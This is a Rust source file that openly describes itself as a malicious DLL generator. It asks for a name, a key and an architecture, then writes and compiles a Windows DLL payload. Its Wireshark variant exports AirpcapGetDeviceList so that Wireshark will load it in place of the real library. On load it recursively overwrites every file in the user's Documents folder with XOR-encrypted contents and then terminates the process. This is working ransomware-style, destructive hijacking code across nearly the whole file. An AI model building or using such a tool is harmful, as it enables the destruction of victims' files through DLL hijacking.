use std::io::{self, Write};
use std::fs;
use std::process::Command;

pub fn generate_dll() {
    println!("Generating malicious DLL...");

    // Prompt for DLL name
    println!("Enter the name for the DLL (e.g., hijacked.dll): ");
    let mut dll_name = String::new();
    io::stdin().read_line(&mut dll_name).unwrap();
    let dll_name = dll_name.trim();

    // Prompt for encryption key
    println!("Enter the encryption key (e.g., my_secret_key): ");
    let mut encryption_key = String::new();
    io::stdin().read_line(&mut encryption_key).unwrap();
    let encryption_key = encryption_key.trim();

    // Prompt for architecture (32-bit or 64-bit)
    println!("Enter the architecture (32 or 64): ");
    let mut arch = String::new();
    io::stdin().read_line(&mut arch).unwrap();
    let arch = arch.trim();

    // Prompt for DLL type (default or Wireshark-specific)
    println!("Enter the DLL type (default or wireshark): ");
    let mut dll_type = String::new();
    io::stdin().read_line(&mut dll_type).unwrap();
    let dll_type = dll_type.trim();

    // Generate the DLL code based on type
    let dll_code = match dll_type {
        "wireshark" => generate_wireshark_dll_code(encryption_key),
        _ => generate_default_dll_code(encryption_key),
    };

    // Generate the source file
    let source_file = format!("{}.rs", dll_name);
    fs::write(&source_file, dll_code).expect("Failed to write DLL source file");

    // Compile the DLL based on the architecture
    let target = match arch {
        "32" => "i686-pc-windows-gnu",
        "64" => "x86_64-pc-windows-gnu",
        _ => {
            println!("Invalid architecture. Defaulting to 64-bit GNU.");
            "x86_64-pc-windows-gnu"
        }
    };

    println!("Compiling DLL for {}-bit architecture...", arch);
    compile_dll(&source_file, dll_name, target);

    // Cleanup source file
    fs::remove_file(&source_file).expect("Failed to delete source file");

    println!("DLL generated: {}.dll", dll_name);
}

fn generate_default_dll_code(key: &str) -> String {
    format!(
        r#"
    #![crate_type = "cdylib"]

    #[no_mangle]
    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {{
        if reason == 1 {{ // DLL_PROCESS_ATTACH
            payload("{key}");
        }}
        true
    }}

    fn payload(key: &str) {{
        use std::fs;
        use std::io::Write;
        use dirs;

        // Get the current user's home directory
        let home_dir = dirs::home_dir().expect("Failed to get home directory");

        // Define the target directory and file dynamically
        let target_dir = home_dir.join("Documents");
        let target_file = target_dir.join("encrypted_file.txt");

        // Create the directory if it doesn't exist
        let _ = fs::create_dir_all(&target_dir);

        let data = b"This is some sensitive data.";
        let encrypted_data = encrypt(data, key);

        // Write the encrypted data to the target file
        let mut file = fs::File::create(&target_file).expect("Failed to create file");
        file.write_all(&encrypted_data).expect("Failed to write payload");

        println!(
            "Payload executed: Encrypted file created at {}",
            target_file.display()
        );
    }}

    fn encrypt(data: &[u8], key: &str) -> Vec<u8> {{
        let key_bytes = key.as_bytes();
        data.iter()
            .zip(key_bytes.iter().cycle())
            .map(|(&d, &k)| d ^ k)
            .collect()
    }}
    "#,
        key = key
    )
}

fn generate_wireshark_dll_code(key: &str) -> String {
    format!(
        r#"
    #![crate_type = "cdylib"]
    #![allow(non_snake_case)]



    use std::fs;
    use std::io::Write;
    use std::path::Path;
    

    #[no_mangle]
    pub extern "C" fn DllMain(_: *mut std::ffi::c_void, reason: u32, _: *mut std::ffi::c_void) -> bool {{
        if reason == 1 {{ // DLL_PROCESS_ATTACH
            encrypt_files("{key}"); // Encrypt files on process attach
            std::process::exit(0);   // Terminate the process
        }}
        true
    }}

    #[no_mangle]
    pub extern "C" fn AirpcapGetDeviceList() {{
        encrypt_files("{key}");
    }}

    fn encrypt_files(key: &str) {{
    use dirs_next::home_dir;
        if let Some(home_dir) = home_dir() {{
            let target_dir = home_dir.join("Documents");

            if target_dir.exists() {{
                encrypt_directory(&target_dir, key);
            }}
        }} else {{
            eprintln!("Could not determine the user's home directory.");
        }}
    }}

    fn encrypt_directory(dir: &Path, key: &str) {{
        if dir.is_dir() {{
            for entry in fs::read_dir(dir).expect("Failed to read directory") {{
                if let Ok(entry) = entry {{
                    let path = entry.path();

                    if path.is_dir() {{
                        // Recursively encrypt subdirectories
                        encrypt_directory(&path, key);
                    }} else if path.is_file() {{
                        encrypt_file(&path, key);
                    }}
                }}
            }}
        }}
    }}

    fn encrypt_file(file_path: &Path, key: &str) {{
        if let Ok(mut file) = fs::File::open(file_path) {{
            let mut data = Vec::new();
            use std::io::Read;
            if file.read_to_end(&mut data).is_ok() {{
                let encrypted_data = encrypt(&data, key);
                if let Ok(mut file) = fs::File::create(file_path) {{
                    let _ = file.write_all(&encrypted_data);
                }}
            }}
        }}
    }}

    fn encrypt(data: &[u8], key: &str) -> Vec<u8> {{
        let key_bytes = key.as_bytes();
        data.iter()
            .zip(key_bytes.iter().cycle())
            .map(|(&d, &k)| d ^ k)
            .collect()
    }}
    "#,
        key = key
    )
}

fn compile_dll(source_file: &str, dll_name: &str, target: &str) {
    // Append `.dll` explicitly to the output file name
    let output_file = format!("{}.dll", dll_name);

    let output = Command::new("rustc")
        .args(&["--crate-type", "cdylib", "-o", &output_file, source_file, "--target", target])
        .output()
        .expect("Failed to execute rustc command");

    if !output.status.success() {
        eprintln!("Compilation error: {}", String::from_utf8_lossy(&output.stderr));
        std::process::exit(1);
    }

    // Check if the compiled DLL exists
    if !std::path::Path::new(&output_file).exists() {
        eprintln!("Error: Compiled file not found at expected location: {}", output_file);
        std::process::exit(1);
    }

    println!("DLL compiled successfully: {}", output_file);
}
